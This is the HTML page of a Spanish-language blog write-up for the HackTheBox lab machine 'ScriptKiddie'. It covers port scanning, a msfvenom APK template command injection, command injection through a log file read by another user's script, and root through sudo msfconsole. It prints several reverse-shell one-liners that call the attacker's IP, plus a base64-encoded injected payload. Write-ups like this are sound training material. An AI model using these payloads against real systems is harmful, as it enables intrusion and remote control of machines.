@@ -1,0 +1,997 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>HackTheBox - ScriptKiddie</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - ScriptKiddie | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="HackTheBox - ScriptKiddie" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Máquina Linux nivel fácil. Un servidor web que ejecuta comandos específicos, pero que con uno de ellos podemos agregar un “template”, ¿qué puede salir mal? Inspeccionaremos un script al detalle y encontraremos una manera de cambiar el flujo del proceso para que haga lo que queramos :) Y validaremos permisos como sudo, con la sorpresa que ejecutando solo 2 líneas somos root mediante msfconsole." />
+<meta property="og:description" content="Máquina Linux nivel fácil. Un servidor web que ejecuta comandos específicos, pero que con uno de ellos podemos agregar un “template”, ¿qué puede salir mal? Inspeccionaremos un script al detalle y encontraremos una manera de cambiar el flujo del proceso para que haga lo que queramos :) Y validaremos permisos como sudo, con la sorpresa que ejecutando solo 2 líneas somos root mediante msfconsole." />
+<link rel="canonical" href="http://localhost:4000/htb/scriptkiddie" />
+<meta property="og:url" content="http://localhost:4000/htb/scriptkiddie" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/scriptkiddie/314banner.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-06-05T00:00:00-07:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/scriptkiddie/314banner.png" />
+<meta property="twitter:title" content="HackTheBox - ScriptKiddie" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2021-06-05T00:00:00-07:00","datePublished":"2021-06-05T00:00:00-07:00","description":"Máquina Linux nivel fácil. Un servidor web que ejecuta comandos específicos, pero que con uno de ellos podemos agregar un “template”, ¿qué puede salir mal? Inspeccionaremos un script al detalle y encontraremos una manera de cambiar el flujo del proceso para que haga lo que queramos :) Y validaremos permisos como sudo, con la sorpresa que ejecutando solo 2 líneas somos root mediante msfconsole.","headline":"HackTheBox - ScriptKiddie","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/scriptkiddie/314banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/scriptkiddie"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/scriptkiddie"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">HackTheBox - ScriptKiddie</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2021-06-05">05 Jun 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/scriptkiddie/314banner.png" alt="HackTheBox - ScriptKiddie">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Máquina Linux nivel fácil. Un servidor web que ejecuta comandos específicos, pero que con uno de ellos podemos agregar un <strong>“template”</strong>, ¿qué puede salir mal? Inspeccionaremos un script al detalle y encontraremos una manera de cambiar el flujo del proceso para que haga lo que queramos :) Y validaremos permisos como <strong>sudo</strong>, con la sorpresa que ejecutando solo 2 líneas somos <strong>root</strong> mediante <em>msfconsole</em>.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/scriptkiddie/314scriptkiddieHTB.png" alt="314scriptkiddieHTB" /></p>
+
+<h3 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h3>
+
+<p><strong>Creada por</strong>: <a href="https://www.hackthebox.eu/profile/4935">0xdf</a>.</p>
+
+<p>Wenas, nos encontraremos con una web bastante traviesa que ejecuta comandos en el sistema (nada relacionado con <strong>command injection</strong>). Uno de los apartados nos permite generar payloads con <code>msfvenom</code>, pero también nos da la opción de agregarle un <strong>template</strong>, buscando por internet nos aprovecharemos de una vulnerabilidad relacionada con <strong>templates en APK’s Android</strong> para conseguir una Shell como el usuario <strong>kid</strong>.</p>
+
+<p>Posteriormente inspeccionaremos a detalle un script al cual tenemos acceso, aprovecharemos una falla en él para sobreescribir un archivo que está leyendo y que ejecute una Shell, en este caso como el dueño del script, <strong>pwn</strong>.</p>
+
+<p>Validando los permisos que tiene <strong>pwn</strong> usando <code>sudo</code> en el sistema (como si estuviéramos ejecutando el proceso como <strong>root</strong>), vemos que puede ejecutar <code>msfvenom</code>, lo usamos para pasarnos a una Shell como <strong>root</strong> :)</p>
+
+<h4 id="clasificación-de-la-máquina">Clasificación de la máquina</h4>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/scriptkiddie/314statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;" /></p>
+
+<p>Juguetona, con tintes de vulnerabilidades conocidas pero poco real :(</p>
+
+<blockquote>
+  <p>Escribo para tener mis “notas”, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.</p>
+</blockquote>
+
+<p>…</p>
+
+<p>¿Qué haremos?</p>
+
+<ol>
+  <li><a href="#enumeracion">Enumeración</a>.</li>
+  <li><a href="#explotacion">Explotación</a>.</li>
+  <li><a href="#movimiento-lateral">Movimiento Lateral</a>.</li>
+  <li><a href="#escalada-de-privilegios">Escalada de privilegios</a>.</li>
+</ol>
+
+<p>…</p>
+
+<h2 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h2>
+
+<p>Realizaremos un escaneo de puertos para saber que servicios está corriendo la máquina.</p>
+
+<pre><code class="language-bash">❭ nmap -p- --open -v 10.10.10.226 -oG initScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td style="text-align: left">Escanea todos los 65535</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Solo los puertos que están abiertos</td>
+    </tr>
+    <tr>
+      <td>-v</td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para usar una <a href="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png">función</a> de <a href="https://s4vitar.github.io/">S4vitar</a> que me extrae los puertos en la clipboard</td>
+    </tr>
+  </tbody>
+</table>
+
+<pre><code class="language-bash">❭ cat initScan 
+# Nmap 7.80 scan initiated Mon Feb 15 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.226
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.10.226 ()   Status: Up
+Host: 10.10.10.226 ()   Ports: 22/open/tcp//ssh///, 5000/open/tcp//upnp///
+# Nmap done at Mon Feb 15 25:25:25 2021 -- 1 IP address (1 host up) scanned in 153.39 seconds
+</code></pre>
+
+<p>Perfecto, nos encontramos los servicios:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>22</td>
+      <td style="text-align: left"><strong><a href="https://es.wikipedia.org/wiki/Secure_Shell">SSH</a></strong></td>
+    </tr>
+    <tr>
+      <td>5000</td>
+      <td style="text-align: left"><strong><a href="https://www.speedguide.net/port.php?port=5000">UPnP</a></strong>: Conjunto de protocolos para la comunicación de periféricos en la red.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Hagamos un escaneo de scripts y versiones con base en cada servicio (puerto), con ello obtenemos información más detallada de cada uno:</p>
+
+<pre><code class="language-bash">❭ nmap -p 22,5000 -sC -sV 10.10.10.226 -oN portScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p</td>
+      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
+    </tr>
+    <tr>
+      <td>-sC</td>
+      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
+    </tr>
+    <tr>
+      <td>-sV</td>
+      <td style="text-align: left">Nos permite ver la versión del servicio</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td style="text-align: left">Guarda el output en un archivo</td>
+    </tr>
+  </tbody>
+</table>
+
+<pre><code class="language-bash">❭ cat portScan 
+# Nmap 7.80 scan initiated Mon Feb 15 25:25:25 2021 as: nmap -p 22,5000 -sC -sV -oN portScan 10.10.10.226
+Nmap scan report for 10.10.10.226
+Host is up (0.19s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
+|_http-title: k1d'5 h4ck3r t00l5
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Feb 15 25:25:25 2021 -- 1 IP address (1 host up) scanned in 18.92 seconds
+</code></pre>
+
+<p>Obtenemos:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+      <th style="text-align: left">Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">22</td>
+      <td style="text-align: left">SSH</td>
+      <td style="text-align: left">OpenSSH 8.2p1 Ubuntu 4ubuntu0.1</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">5000</td>
+      <td style="text-align: left">HTTP</td>
+      <td style="text-align: left">Werkzeug httpd 0.16.1 (Python)</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Pues démosle a cada servicio y veamos que podemos romper (:</p>
+
+<p>…</p>
+
+<p>En cuanto al puerto <strong>22</strong> y su versión no tenemos nada. Basándonos en el puerto <code>5000</code>:</p>
+
+<h3 id="puerto-5000">Puerto 5000 <a href="#puerto-5000">⌖</a></h3>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/scriptkiddie/314page5000.png" alt="314page5000" /></p>
+
+<p>Varios apartados donde podemos interactuar y ejecutar instrucciones en el sistema que posteriormente se nos mostraran en el mismo sitio, como por ejemplo, hagamos el primero apartado donde realiza un escaneo de los 100 puertos más populares:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/scriptkiddie/314page5000_scanTOP100.png" alt="314page5000_scanTOP100" /></p>
+
+<p>Pues exploremos y veamos como podemos colar alguna ejecución de comandos de nuestro lado…</p>
+
+<p>Despues de un rato intentando <code>command injection</code> no obtuve nada. Pero pensando en que estarían haciendo los comandos por detrás y como se estarían ejecutando, podemos enfocarnos en el apartado <code>msfvenom</code>.</p>
+
+<blockquote>
+  <p><code>msfvenom</code> en pocas palabras nos permite crear payloads que podemos usar en muchos formatos y aplicaciones.</p>
+</blockquote>
+
+<ul>
+  <li><a href="https://netsec.ws/?p=331">Creating Metasploit Payloads</a>.</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/scriptkiddie/314page5000_msfVinit.png" alt="314page5000_msfVinit" /></p>
+
+<p>…</p>
+
+<h2 id="explotacion">Explotación <a href="#explotacion">#</a></h2>
+
+<p>Si nos fijamos es el único que nos permite interactuar con la ejecución, podemos agregándole un template… Jmm si buscamos en internet <code>exploit template msfvenom</code>, obtenemos esto:</p>
+
+<ul>
+  <li><a href="https://www.exploit-db.com/exploits/49491">Metasploit Framework 6.0.11 - msfvenom APK template command injection</a>.</li>
+</ul>
+
+<p>Se trata de una vulnerabilidad que permite ejecutar comandos en la generación de un APK para Android como template.</p>
+
+<p>Viendo el código debemos cambiar los comandos que queremos ejecutar, intentemos establecer una Reverse Shell de una vez:</p>
+
+<pre><code class="language-py">...
+# Change me·
+payload = 'nc 10.10.14.47 4433 -e /bin/bash'
+...
+</code></pre>
+
+<p>Nos ponemos en escucha:</p>
+
+<pre><code class="language-bash">❭ nc -lvp 4433
+listening on [any] 4433 ...
+</code></pre>
+
+<p>Y ejecutamos el script para que nos genere el <code>.apk</code> malicioso con el que posteriormente ejecutaremos el proceso en la web:</p>
+
+<pre><code class="language-bash">❭ python3 msfvenom_APK.py 
+[+] Manufacturing evil apkfile
+Payload: nc 10.10.14.47 4433 -e /bin/bash
+-dname: CN='|echo bmMgMTAuMTAuMTQuNDcgNDQzMyAtZSAvYmluL2Jhc2g= | base64 -d | sh #
+
+  adding: empty (stored 0%)
+jar signed.
+
+Warning: 
+The signer's certificate is self-signed.
+
+[+] Done! apkfile is at /tmp/tmp6ns2_i9t/evil.apk
+Do: msfvenom -x /tmp/tmp6ns2_i9t/evil.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null
+</code></pre>
+
+<p>Perfecto, ahora (como dice al final) plasmemos la ejecución pero en la web:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/scriptkiddie/314page5000_msfVrun.png" alt="314page5000_msfVrun" /></p>
+
+<p>Entonces si lo comparamos con la ejecución por Shell, cada campo equivale a:</p>
+
+<ul>
+  <li><strong>-x</strong>: El archivo <code>APK</code> malicioso (donde podemos subir el template).</li>
+  <li><strong>LHOST</strong>: Debe ser <code>localhost</code>, ya que queremos ejecutar los comandos en la máquina para que desde ahí nos genere la Reverse Shell.</li>
+</ul>
+
+<p>Damos en <code>generate</code>:</p>
+
+<p>Pero en la web obtenemos <code>Something went wrong</code>. Así que probablemente sea que estamos con el binario <code>nc</code> que no soporta el argumento <code>-e</code>, intentémoslo con ese binario:</p>
+
+<ul>
+  <li><a href="https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/">Reverse Shell Cheat Sheet</a>.</li>
+</ul>
+
+<pre><code class="language-py">...
+payload = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.14.47 4433 &gt;/tmp/f'
+...
+</code></pre>
+
+<p>Ejecutamos script y obtenemos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/scriptkiddie/314bash_revSHapkfile.png" alt="314bash_revSHapkfile" /></p>
+
+<p>Una Shell como el usuario <code>kid</code>, perfecto. Antes de seguir volvamos nuestra Shell una «Shell» completamente interactiva, para que podamos movernos entre comandos, regresar histórico, hacer <code>CTRL + C</code> sin miedo a perder la sesión y para estar más cómodos.</p>
+
+<p>Escribimos (todo seguido):</p>
+
+<pre><code class="language-bash">kid@scriptkiddie:~/html$ script /dev/null -c bash
+(CTRL + Z)
+❭ stty raw -echo
+❭ fg #(asi no lo veas se esta escribiendo)
+        reset
+Terminal type? xterm
+kid@scriptkiddie:~/html$ export TERM=xterm
+kid@scriptkiddie:~/html$ export SHELL=bash
+kid@scriptkiddie:~/html$ stty rows 43 columns 192 #(Este depende del tamano de tu pantalla (`$ stty -a`))
+</code></pre>
+
+<p>Y listo hemos hecho el tratamiento de la TTY perfectamente.</p>
+
+<ul>
+  <li><a href="https://www.youtube.com/watch?v=GVjNI-cPG6M&amp;t=1689">Savitar te lo explica gráficamente</a>.</li>
+</ul>
+
+<p>Con <code>kid</code> tenemos la flag de user.</p>
+
+<p>…</p>
+
+<h2 id="movimiento-lateral">Movimiento lateral <a href="#movimiento-lateral">#</a></h2>
+
+<p>Dando vueltas vemos otro usuario: <code>pwn</code>, el cual es su <code>home</code> tiene un archivo interesante (el cual despues de algún testeo sabemos que se está ejecutando demasiado rápido)</p>
+
+<h4 id="explicación-script-">Explicación script 🤪</h4>
+
+<p>Detallémoslo a vel:</p>
+
+<pre><code class="language-bash">kid@scriptkiddie:~$ cat /home/pwn/scanlosers.sh 
+#!/bin/bash
+
+log=/home/kid/logs/hackers
+
+cd /home/pwn/
+cat $log | cut -d' ' -f3- | sort -u | while read ip; do
+    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2&gt;&amp;1 &gt;/dev/null" &amp;
+done
+
+if [[ $(wc -l &lt; $log) -gt 0 ]]; then echo -n &gt; $log; fi
+</code></pre>
+
+<p>El archivo <code>hackers</code> (si nos fijamos en el script que tenemos en la ruta <code>/home/kid/html</code> llamado <code>app.py</code>) guarda un TimeStamp y una IP de la persona que intenta “hackear” el campo donde le ingresábamos algo a <code>searchsploit</code>:</p>
+
+<pre><code class="language-py">...
+with open('/home/kid/logs/hackers', 'a') as f:
+    f.write(f'[{datetime.datetime.now()}] {srcip}\n')
+return render_template('index.html', sserror="stop hacking me - well hack you back")
+</code></pre>
+
+<ul>
+  <li>El script de <code>pwn</code> lee el archivo <code>/home/kid/logs/hackers</code> y lo guarda en la variable <code>$log</code>, (el archivo casi siempre está vacío, si nos adelantamos vemos al final del script que lo limpia (<code>echo -n &gt; $log</code>),</li>
+</ul>
+
+<p>Emulando esto en nuestro entorno y leyendo el script (para saber como llega la variable <code>srcip</code>), está guardando esto en el archivo con esta sintaxis:</p>
+
+<pre><code class="language-bash">[Fecha Hora] IP
+</code></pre>
+
+<pre><code class="language-bash">kid@scriptkiddie:~$ cat /home/kid/logs/hackers
+
+</code></pre>
+
+<ul>
+  <li>Toma el contenido y extrae la IP para hacerle un escaneo de los 10 puertos más populares, esto usando <code>sh</code> llamando a <code>nmap</code>, pero ¿cómo?, hagamos un ejemplo rápido:</li>
+</ul>
+
+<p>Tenemos el archivo <code>hackers</code> con toda esta línea:</p>
+
+<pre><code class="language-bash">1 22 333 4444 55555 666666
+</code></pre>
+
+<p>Al hacer el cut esta “cortando” el archivo en pedazos, pero ¿en cuántos pedazos? Bueno, depende del carácter que le pasemos como separador en el argumento <code>-d</code>, en este caso el espacio: <code>' '</code>. Pero ahora como le indicamos que nos muestre solo <code>X</code> ítem de toda la línea, pues digamos que queremos que solo nos muestre los números <code>55555</code>, pues se lo indicaríamos con el argumento <code>f</code>, entonces tendríamos:</p>
+
+<pre><code class="language-bash">❭ cat hackers | cut -d ' ' -f3
+333        # Esta seria la IP que extraeria
+</code></pre>
+
+<p>Hasta acá todo perfecto, peeeeeeeeeeeero si nos fijamos en nuestro <code>cut</code> y el del script vemos una diferencia bastante pequeña pero muy significativa:</p>
+
+<ul>
+  <li>Nosotros hacemos <code>cut -d ' ' -f3</code></li>
+  <li>El script hace <code>cut -d ' ' -f3-</code></li>
+</ul>
+
+<p>La diferencia la vemos acá:</p>
+
+<pre><code class="language-bash">❭ cat hackers | cut -d ' ' -f3
+333
+</code></pre>
+
+<pre><code class="language-bash">❭ cat hackers | cut -d ' ' -f3-
+333 4444 55555 666666
+</code></pre>
+
+<p>El símbolo <code>-</code> le indica que nos muestre desde nuestro corte hasta donde acabe la línea.</p>
+
+<p>Perfectooooo, podemos aprovecharnos de esto fácilmente, recordemos que tenemos:</p>
+
+<ul>
+  <li>El archivo <code>/home/pwn/scanlosers.sh</code> se está ejecutando automáticamente muy rápido,</li>
+  <li>Está leyendo el archivo <code>/home/kid/logs/hackers</code> (al cual tenemos acceso y podemos sobreescribirlo),</li>
+  <li>Pero debemos ser rápidos, ya que al final del script lo está sobreescribiendo con valores nulos si el tamaño del archivo es mayor a 0.</li>
+  <li>Sabiendo que todo lo que venga despues del corte en el tercer (<code>3</code>) espacio se está leyendo, podemos indicarle que no solo extraiga la IP, sino que nos ejecute nuestro payload:</li>
+</ul>
+
+<p>…</p>
+
+<p>Entonces podemos crearnos un script que sobreescriba el contenido del archivo <code>/home/kid/logs/hackers</code> con nuestro payload:</p>
+
+<p>Como prueba inicial digámosle que nos mande una traza hacia nuestra máquina con <code>nc</code>:</p>
+
+<pre><code class="language-bash">#!/bin/bash
+
+while true; do
+    echo "1 2 3;nc 10.10.14.47 4434" &gt; /home/kid/logs/hackers
+done
+</code></pre>
+
+<blockquote>
+  <p>Sencillamente nos aprovechamos que toma toooooda la línea despues del 3. Entonces contamos el proceso y ejecutamos lo nuestro, terminamos (separamos) la ejecución del comando con un simple <code>;</code>. Como toda la vida :P</p>
+</blockquote>
+
+<p>Pongámonos en escucha por el puerto <code>4434</code> y vemos si recibimos algo:</p>
+
+<pre><code class="language-bash">❭ nc -lvp 4434
+listening on [any] 4434 ...
+</code></pre>
+
+<p>Ejecutamos el script y estamos atentos :P</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/scriptkiddie/314bash_scanlosers_injectionNC.png" alt="314bash_scanlosers_injectionNC" /></p>
+
+<p>Bien bien, recibimos la petición, así que aprovechémonos de esto para generar una Shell :O</p>
+
+<p><strong>(</strong></p>
+
+<p>Pueden probar de todo, si ejecutamos:</p>
+
+<pre><code class="language-bash">...
+echo "1 2 3;id | nc 10.10.14.47 4434" &gt; /home/kid/logs/hackers
+...
+</code></pre>
+
+<p>Obtenemos:</p>
+
+<pre><code class="language-bash">❭ nc -lvp 4434
+listening on [any] 4434 ...
+10.10.10.226: inverse host lookup failed: Host name lookup failure
+connect to [10.10.14.47] from (UNKNOWN) [10.10.10.226] 52764
+uid=1001(pwn) gid=1001(pwn) groups=1001(pwn)
+</code></pre>
+
+<p><strong>)</strong></p>
+
+<p>Ahora si a por la Shell, solo quería mostrar eso :P</p>
+
+<p>Nuestro script quedaría así:</p>
+
+<pre><code class="language-bash">#!/bin/bash
+
+while true; do
+    echo "1 2 3;bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.47/4434 0&gt;&amp;1'" &gt; /home/kid/logs/hackers
+done
+</code></pre>
+
+<p>Y tendríamos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/scriptkiddie/314bash_scanlosers_injectionrevSH.png" alt="314bash_scanlosers_injectionrevSH" /></p>
+
+<p>Opa, tenemos una sesión como <code>pwn</code></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/scriptkiddie/314google_gifdanceNBA.gif" style="display: block; margin-left: auto; margin-right: auto; width: 40%;" /></p>
+
+<p>¡Enumeremos pa vel!</p>
+
+<p>…</p>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios <a href="#escalada-de-privilegios">#</a></h2>
+
+<p>Si validamos que puede ejecutar <code>pwn</code> usando sudo (con permisos de <code>root</code>) en la máquina, nos encontramos:</p>
+
+<pre><code class="language-bash">pwn@scriptkiddie:~$ sudo -l
+Matching Defaults entries for pwn on scriptkiddie:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User pwn may run the following commands on scriptkiddie:
+    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
+</code></pre>
+
+<p>El binario <code>msfconsole</code>, veamos:</p>
+
+<pre><code class="language-bash">pwn@scriptkiddie:~$ sudo /opt/metasploit-framework-6.0.9/msfconsole
+</code></pre>
+
+<p>Y tenemos:</p>
+
+<pre><code class="language-bash">msf6 &gt; id
+[*] exec: id
+
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+
+<pre><code class="language-bash">msf6 &gt; /bin/bash
+[*] exec: /bin/bash
+
+root@scriptkiddie:/home/pwn# cd
+root@scriptkiddie:~# ls
+root.txt  snap
+</code></pre>
+
+<p>Perfecto, solo nos quedaría ver las flags:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/scriptkiddie/314flags.png" alt="314flags" /></p>
+
+<p>…</p>
+
+<p>Linda máquina, sencilla (no había prestado bastante atención al script de <code>pwn</code> y estuve bastante estancado ahí), es muy CTF, pero bueno, se disfruta igual (:</p>
+
+<p>Así que nada, está claro que nos vamos a frustrar en algunos momentos, pero lo importante es no rendirse y darle, darle pa lante.</p>
+
+<p>Muchas gracias y como siempre, a seguir rompiendo todo :*</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - ScriptKiddie&url=http://localhost:4000/htb/scriptkiddie" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#code-analysis">code-analysis</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#command-injection">command-injection</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#file-upload">file-upload</a>               
+                    
